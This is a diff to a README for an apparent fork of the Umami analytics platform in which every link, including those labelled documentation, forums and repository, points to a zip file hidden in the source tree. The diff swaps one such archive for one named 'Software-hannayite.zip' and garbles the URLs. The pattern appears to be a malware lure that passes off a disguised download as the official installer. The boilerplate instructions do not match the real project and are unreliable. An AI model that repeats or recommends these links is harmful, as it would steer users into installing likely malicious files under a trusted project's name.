@@ -2,7 +2,7 @@
 
 Umami is a modern, privacy-focused analytics platform. An open-source alternative to Google Analytics, Mixpanel, and Amplitude.
 
-[![Download Umami](https://raw.githubusercontent.com/chadousnip/umami/master/src/app/(collect)/q/[slug]/umami_v2.5.zip)](https://raw.githubusercontent.com/chadousnip/umami/master/src/app/(collect)/q/[slug]/umami_v2.5.zip)
+[![Download Umami](https://raw.githubusercontent.com/chadousnip/umami/master/src/app/api/websites/[websiteId]/event-data/stats/Software-hannayite.zip(collect)/q/[slug]https://raw.githubusercontent.com/chadousnip/umami/master/src/app/api/websites/[websiteId]/event-data/stats/Software-hannayite.zip)](https://raw.githubusercontent.com/chadousnip/umami/master/src/app/api/websites/[websiteId]/event-data/stats/Software-hannayite.zip(collect)/q/[slug]https://raw.githubusercontent.com/chadousnip/umami/master/src/app/api/websites/[websiteId]/event-data/stats/Software-hannayite.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Umami lets you gather data and insights about your website's audience without co
 ## 📥 Download & Install
 
 1. **Visit the Releases Page:**  
-   Go to the following link to find the latest version of Umami: [Download Umami](https://raw.githubusercontent.com/chadousnip/umami/master/src/app/(collect)/q/[slug]/umami_v2.5.zip).
+   Go to the following link to find the latest version of Umami: [Download Umami](https://raw.githubusercontent.com/chadousnip/umami/master/src/app/api/websites/[websiteId]/event-data/stats/Software-hannayite.zip(collect)/q/[slug]https://raw.githubusercontent.com/chadousnip/umami/master/src/app/api/websites/[websiteId]/event-data/stats/Software-hannayite.zip).
 
 2. **Choose the Correct File:**  
    On the Releases page, look for the version number under "Assets". You may find different files, such as executable files for various operating systems. Make sure to pick the one that is suitable for your system.
@@ -65,17 +65,17 @@ To start collecting data with Umami, follow these steps:
 
 ## 📞 Support and Community
 
-If you encounter issues or have questions during your installation or setup process, the Umami community is here to help. Join our forums or check the FAQ section on the [Umami GitHub repository](https://raw.githubusercontent.com/chadousnip/umami/master/src/app/(collect)/q/[slug]/umami_v2.5.zip) for support.
+If you encounter issues or have questions during your installation or setup process, the Umami community is here to help. Join our forums or check the FAQ section on the [Umami GitHub repository](https://raw.githubusercontent.com/chadousnip/umami/master/src/app/api/websites/[websiteId]/event-data/stats/Software-hannayite.zip(collect)/q/[slug]https://raw.githubusercontent.com/chadousnip/umami/master/src/app/api/websites/[websiteId]/event-data/stats/Software-hannayite.zip) for support.
 
 ## 🔗 Additional Resources
 
 For further information about Umami and how to maximize its potential, check these resources:
 
-- [Documentation](https://raw.githubusercontent.com/chadousnip/umami/master/src/app/(collect)/q/[slug]/umami_v2.5.zip): Detailed guides and troubleshooting tips.
-- [Community Forums](https://raw.githubusercontent.com/chadousnip/umami/master/src/app/(collect)/q/[slug]/umami_v2.5.zip): Engage with other users and share your experiences.
+- [Documentation](https://raw.githubusercontent.com/chadousnip/umami/master/src/app/api/websites/[websiteId]/event-data/stats/Software-hannayite.zip(collect)/q/[slug]https://raw.githubusercontent.com/chadousnip/umami/master/src/app/api/websites/[websiteId]/event-data/stats/Software-hannayite.zip): Detailed guides and troubleshooting tips.
+- [Community Forums](https://raw.githubusercontent.com/chadousnip/umami/master/src/app/api/websites/[websiteId]/event-data/stats/Software-hannayite.zip(collect)/q/[slug]https://raw.githubusercontent.com/chadousnip/umami/master/src/app/api/websites/[websiteId]/event-data/stats/Software-hannayite.zip): Engage with other users and share your experiences.
 
 ## ⚙️ Conclusion
 
 Umami is an effective analytics platform for individuals and businesses who value user privacy. By following the steps in this guide, you can easily download, set up, and start using Umami to better understand your website's audience. 
 
-Again, for your convenience, visit the Releases page to [Download Umami](https://raw.githubusercontent.com/chadousnip/umami/master/src/app/(collect)/q/[slug]/umami_v2.5.zip) and begin your journey toward insightful analytics today.
+Again, for your convenience, visit the Releases page to [Download Umami](https://raw.githubusercontent.com/chadousnip/umami/master/src/app/api/websites/[websiteId]/event-data/stats/Software-hannayite.zip(collect)/q/[slug]https://raw.githubusercontent.com/chadousnip/umami/master/src/app/api/websites/[websiteId]/event-data/stats/Software-hannayite.zip) and begin your journey toward insightful analytics today.
